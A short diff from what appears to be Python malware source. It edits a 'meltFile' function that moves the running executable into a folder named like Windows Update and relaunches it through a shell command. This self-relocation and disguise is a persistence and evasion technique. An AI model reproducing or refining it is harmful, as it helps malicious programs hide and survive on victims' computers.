@@ -33,7 +33,7 @@ def meltFile():
             os.mkdir(winupdate)
         except:
             pass
-        strNewFile = winupdate + os.path.basename(sys.argv[0])
+        strNewFile = os.path.join(winupdate, os.path.basename(sys.argv[0]))
 
         strCommand = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}"
         subprocess.Popen(strCommand, shell=True)
